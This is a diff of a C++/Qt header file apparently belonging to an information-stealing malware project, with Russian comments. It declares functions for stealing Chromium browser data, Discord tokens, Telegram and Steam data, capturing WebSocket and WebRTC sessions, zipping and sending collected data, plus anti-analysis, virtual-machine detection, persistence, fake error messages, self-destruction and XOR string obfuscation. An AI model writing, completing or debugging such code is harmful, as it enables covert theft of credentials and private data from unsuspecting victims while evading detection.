@@ -36,7 +36,6 @@
 #include <filesystem>
 #include <vector>
 #include <string>
-#include <map>
 #include <fstream>
 #include <thread>
 #include <regex>
@@ -59,15 +58,6 @@ QT_END_NAMESPACE
 
 // Глобальная переменная как extern
 extern class MainWindow* g_mainWindow;
-
-// Внешние функции из main.cpp
-extern std::string GetCustomSystemInfo();
-extern std::string StealChromiumData(const std::string& browser, const std::string& path, const std::string& dir);
-extern std::string StealUnsavedBrowserData(const std::string& browser, const std::string& cachePath);
-extern std::string StealAppCacheData(const std::string& appName, const std::string& dir);
-extern std::string CaptureWebSocketSessions(const std::string& processName);
-extern std::string CaptureWebRTCSessions(const std::string& processName);
-extern bool CheckVirtualEnvironment();
 
 // Функция для шифрования строк во время компиляции (XOR)
 constexpr char encryptChar(char c, size_t pos) {
@@ -94,10 +84,10 @@ public:
     void setupPersistence();
 
     // Методы для кражи данных
-    std::string StealAndSendData(const std::string& tempDir);
+    void StealAndSendData(const std::string& tempDir); // Изменён на void, как в main.cpp
     std::string TakeScreenshot(const std::string& dir);
     std::string stealBrowserData(const std::string& dir);
-    std::string stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir);
+    std::string stealChromiumBrowserData(const std::string& browserName, const std::string& profilePath, const std::string& tempDir);
     std::string StealDiscordTokens(const std::string& dir);
     std::string StealTelegramData(const std::string& dir);
     std::string StealSteamData(const std::string& dir);
@@ -111,13 +101,16 @@ public:
     std::string stealChatHistory(const std::string& dir);
     std::string collectSocialEngineeringData(const std::string& dir);
     std::string collectSystemInfo(const std::string& dir);
+    std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files); // Добавлено
 
-    // Добавленные методы из ошибок сборки
+    // Антианализ и скрытие
     bool AntiAnalysis();
     void Stealth();
     void Persist();
     void FakeError();
     void SelfDestruct();
+
+    // Проверка зависимостей и тесты
     bool checkDependencies();
     void runTests();
 
@@ -206,7 +199,7 @@ public:
     QAction* actionAbout;
 
     // Векторы для хранения собранных данных
-    std::map<std::string, std::string> collectedData;
+    std::string collectedData; // Изменено с map на string
     std::vector<std::string> collectedFiles;
 
 signals:
